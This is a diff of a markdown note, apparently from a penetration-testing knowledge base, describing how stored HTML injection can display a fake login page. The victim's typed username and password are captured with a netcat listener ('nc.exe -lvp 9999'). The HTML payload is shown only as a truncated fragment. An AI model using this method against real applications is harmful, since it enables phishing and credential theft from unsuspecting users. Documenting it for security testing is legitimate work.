@@ -32,16 +32,48 @@ Stored HTML injection can be manipulated by an attacker to steal the credentials
 
 Stored HTML injection can be manipulated by an attacker to steal the credentials of an application. The attacker can maintain persistent access to application by impersonating the user with stolen credentials.
 
+
+
 # Instructions
+
+
 
 1. place the payload in the text box as shown in the belwo image.
 
+
+
 *Payload*
+
+
+
+
+
+
 
 **Code**: [[<div class="code">test</div>
 <div style="position:]]
 
+
+
+
+
+
+
+![9c2723dd-d336-4197-a9cf-8a35877cb530.PNG](_assets/images/Mash/9c2723dd-d336-4197-a9cf-8a35877cb530.PNG)
+
+
+
+
+
 2. Use *netcat *in a different machine in a listening mode  before submitting the request in step 1.
+
+
+
+
+
+
+
+
 
 **Command** ([[nc.exe -lvp 9999]]):
 
@@ -49,9 +81,39 @@ Stored HTML injection can be manipulated by an attacker to steal the credentials
 nc.exe -lvp 9999
 ```
 
+
+
+
+
 3. After the request is submitted in step 1, a login page with username and password impersonating the actual login page of the application is displayed .
 
+
+
+
+
+![30429e32-79e3-403c-a3c9-10834fcbd27c.PNG](_assets/images/Mash/30429e32-79e3-403c-a3c9-10834fcbd27c.PNG)
+
+
+
+
+
 4. A victim will enter the *username *and *password *assuming to be the actual login application . After *login i*s *clicked  , *observe the response* in nc *command window which is listening mode.  *Username *along with *password *can be observed as shown below.
+
+
+
+
+
+
+
+![d067681b-2d87-4e45-a988-f16fdd8cb77f.png](_assets/images/Mash/d067681b-2d87-4e45-a988-f16fdd8cb77f.png)
+
+
+
+
+
+
+
+
 
 ## Platforms
 
@@ -68,3 +130,5 @@ nc.exe -lvp 9999
 - [[impersonation]]
 - [[stored HTML injection]]
 - [[Web Applications]]
+
+
